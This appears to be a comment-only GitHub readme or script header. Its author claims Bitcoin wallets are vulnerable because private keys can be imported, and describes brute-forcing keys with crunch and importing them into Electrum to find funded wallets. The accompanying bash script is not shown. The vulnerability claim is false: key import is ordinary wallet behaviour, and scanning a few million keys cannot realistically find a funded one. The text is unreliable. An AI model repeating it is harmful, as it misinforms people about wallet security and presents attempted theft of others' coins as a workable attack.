#Github,

#	It might be possible to scan bitcoin private keys sitting on the network due to a vulnerability in the way bitcoin was #designed since there is nothing really safeguarding the internal framework of the bitcoin wallet either in classic, core or #other variants. Even by encrypting your wallet nothing prevents the importation of a private key by changing a configuration #flag in any wallet whether it is classic, core or a variant. I have attempted to test a basic attack vector using a password #generation program based on JTR and crunch (https://sourceforge.net/projects/crunch-wordlist/) to generate a range of base 58 #values based on bitcoin private keys and under further modification it is possible to continue to customize this form of #private key deep scan and execute it as a basic attack vector. The banking system should be notified not to get on-board with #the Bitcoin network, even though originally the bitcoin network might have represented a form of Independence from banking #institutions to by pass terrible fees from the banks and other dilemmas caused by most banks having full control.
#	As an example of private key generation and experimentation within the bitcoin network some private keys start with #L5..c4 or Ky..k1 < as an example 52 characters alpha-numeric no special characters, decoded they flip around to an address #starting with 1 as part of the end decoded process, similar to how paper wallets are printed exported and imported there is #nothing protecting a paper wallet if it is a known similar to how a private key bears no security or protection from import to #a wallet whether it is classic, core or a variant.
#	I estimate on a modern system this deep key scan for a small set of keys ranging in a few million private keys could #take anywhere from 3 to 4 months to generate and scan, furthermore I have written a crude script to try newly generated private #keys using “crunch” password generator to generate 52 character private keys starting with L or K.

#as an example using bash from a crude semi working type

#where the .txt files are private key deep search blocks generated by crunch password generator
#and electrum has to have a config flag flipped in order to import private keys, in order to being import
#you have to import a pre-existing working private key into electrum which is used here.
